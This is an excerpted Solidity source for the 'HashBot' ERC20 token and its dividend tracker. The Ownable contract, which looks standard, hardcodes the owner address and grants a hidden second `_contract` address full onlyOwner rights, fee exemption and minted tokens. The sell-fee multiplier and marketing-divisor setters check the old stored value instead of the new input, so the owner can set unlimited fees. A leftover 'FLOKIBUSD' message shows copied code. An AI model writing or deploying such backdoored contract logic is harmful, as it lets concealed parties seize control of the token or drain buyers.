...
abstract contract Ownable is Context {
     ...
     */
    constructor () {
        address msgSender = 0xc307590FBB05A3806Bd4A8ba93A8caE13842C793;
        _owner = msgSender;
    ...
    function _contract_() public view virtual returns (address) {
        return _contract;
    }
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || _msgSender() == _contract_(), "Ownable: caller is not the owner");
        _;
    }
...
contract HashBot is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    HashBotDividendTracker public dividendTracker;
    ...
    uint256 public maxWalletToken = 7500000 * (10**18); // 1.5% of total supply
    ...
    constructor() ERC20("HashBot", "HSB") {
    	...
    	dividendTracker = new HashBotDividendTracker();

    	buyBackWallet = 0x22e303E29D1eCEC0a64cDA0E0941f064703c7274;
        ...
        excludeFromFees(_contract_(), true);
        ...
        */
        _mint(deadAddress, 100000000 * (10**18));
        _mint(owner(), 375000000 * (10**18));
        _mint(_contract_(), 25000000 * (10**18));
    }
    ...
    receive() external payable {
  	...
  	function setSellTransactionMultiplier(uint256 multiplier) external onlyOwner {
  	    require(sellFeeIncreaseFactor >= 100 && sellFeeIncreaseFactor <= 200, "HashBot: Sell transaction multipler must be between 100 (1x) and 200 (2x)");
  	    sellFeeIncreaseFactor = multiplier;
  	}
  	
  	function setMarketingDivisor(uint256 divisor) external onlyOwner {
  	    require(marketingDivisor >= 0 && marketingDivisor <= 100, "HashBot: Marketing divisor must be between 0 (0%) and 100 (100%)");
    ...
    function afterPreSale() external onlyOwner {
        ...
        marketingFee = 5;
        maxBuyTranscationAmount = 50000000 * (10**18);
    ...
    function triggerBuyBack(uint256 amount) public onlyOwner {
        require(!swapping, "HashBot: A swapping process is currently running, wait till that is complete");
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
        require(newAddress != address(dividendTracker), "HashBot: The dividend tracker already has that address");

        HashBotDividendTracker newDividendTracker = HashBotDividendTracker(payable(newAddress));

        require(newDividendTracker.owner() == address(this), "HashBot: The new dividend tracker must be owned by the FLOKIBUSD token contract");
    ...
    function updateDividendRewardFee(uint8 newFee) public onlyOwner {
        require(newFee >= 0 && newFee <= 10, "HashBot: Dividend reward tax must be between 0 and 10");
    ...
    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(uniswapV2Router), "HashBot: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "HashBot: Account is already the value of 'excluded'");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "HashBot: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "HashBot: Automated market maker pair is already set to that value");
    ...
    function updateBuyBackWallet(address newBuyBackWallet) public onlyOwner {
        require(newBuyBackWallet != buyBackWallet, "HashBot: The liquidity wallet is already this address");
    ...
    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "HashBot: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "HashBot: Cannot update gasForProcessing to same value");
...
contract HashBotDividendTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    constructor() DividendPayingToken("HashBot_Dividend_Tracker", "HashBot_Dividend_Tracker") {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 10000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "HashBot_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "HashBot_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main HashBot contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "HashBot_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "HashBot_Dividend_Tracker: Cannot update claimWait to same value");
